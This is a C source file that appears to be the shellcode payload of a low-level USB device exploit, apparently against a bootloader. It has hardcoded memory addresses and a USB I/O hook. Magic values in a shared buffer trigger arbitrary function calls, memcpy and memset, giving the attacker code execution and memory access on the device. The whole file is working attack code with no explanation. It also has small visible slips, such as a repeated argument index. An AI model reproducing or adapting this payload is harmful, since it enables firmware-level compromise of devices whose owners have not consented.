#define EXEC_MAGIC 0x6578656365786563
#define DONE_MAGIC 0x646F6E65646F6E65
#define MEMC_MAGIC 0x6D656D636D656D63
#define MEMS_MAGIC 0x6D656D736D656D73

unsigned long *LOAD_ADDRESS = 0x1800B0000;
const unsigned long *USB_CORE_DO_IO = 0x10000DC98;


unsigned long *memset_shellcode(unsigned long *target, unsigned long data, unsigned long nbytes)
{
    unsigned long value = (data & 0xFFu) * 0x101010101010101;

    unsigned long *addr = target;
    while(nbytes >= 8)
    {
        *addr = value;
        addr++;
        nbytes -= 8;
    }

    if(nbytes >= 4)
    {
        *(unsigned int *) addr = (unsigned int) value;
        addr = (unsigned long *) (((unsigned int *) addr) + 1);
        nbytes -= 4;
    }

    if(nbytes >= 2)
    {
        *(unsigned short *) addr = (unsigned short) value;
        addr = (unsigned long *) (((unsigned short *) addr) + 1);
        nbytes -= 2;
    }

    if(nbytes != 0)
    {
        *(unsigned char *) addr = (unsigned char) value;
    }

    return target;
}

unsigned long *memcpy_shellcode(unsigned long *target, unsigned long *source, unsigned long nbytes)
{
    unsigned long *addr = target;
    while(nbytes >= 8)
    {
        *addr = *source;
        addr++;
        source++;

        nbytes -= 8;
    }

    if(nbytes >= 4)
    {
        *(unsigned int *) addr = *(unsigned int *) source;
        addr = (unsigned long *) (((unsigned int *) addr) + 1);
        source = (unsigned long *) (((unsigned int *) source) + 1);

        nbytes -= 4;
    }

    if(nbytes >= 2)
    {
        *(unsigned short *) addr = *(unsigned short *) source;
        addr = (unsigned long *) (((unsigned short *) addr) + 1);
        source = (unsigned long *) (((unsigned short *) source) + 1);

        nbytes -= 2;
    }

    if(nbytes != 0)
    {
        *(unsigned char *) addr = *(unsigned char *) source;
        addr = (unsigned long *) (((unsigned char *) addr) + 1);
        source = (unsigned long *) (((unsigned char *) source) + 1);

        nbytes -= 2;
    }

    return target;
}

void shellcode(unsigned short length)
{
    unsigned long *addr = LOAD_ADDRESS;
    unsigned long res;

    if(length + 2 == -1)
    {
        res = *LOAD_ADDRESS;
        if(res == EXEC_MAGIC)
        {
            unsigned long
            (*ptr)(unsigned long, unsigned long, unsigned long, unsigned long,
                   unsigned long, unsigned long, unsigned long, unsigned long) =
            (unsigned long (*)(unsigned long, unsigned long, unsigned long, unsigned long,
                               unsigned long, unsigned long, unsigned long, unsigned long)) addr[1];

            addr[0] = 0;
            res = ptr(addr[2], addr[3], addr[4], addr[5], addr[6], addr[7], addr[8], addr[8]);
            addr[0] = DONE_MAGIC;
            addr[1] = res;
        }
        else
        {
            if(res == MEMC_MAGIC)
            {
                addr[0] = 0;
                memcpy_shellcode(addr[2], addr[3], addr[4]);
                addr[0] = DONE_MAGIC;
            }
            else if(res == MEMS_MAGIC)
            {
                addr[0] = 0;
                memset_shellcode(addr[2], addr[3], addr[4]);
                addr[0] = DONE_MAGIC;
            }
        }
    }

    void (*usb_core_do_io)(unsigned char, unsigned long *, unsigned short, unsigned short) =
    (void (*)(unsigned char, unsigned long *, unsigned short, unsigned short)) USB_CORE_DO_IO;
    usb_core_do_io(0x80, addr, length + 6, 0);
}
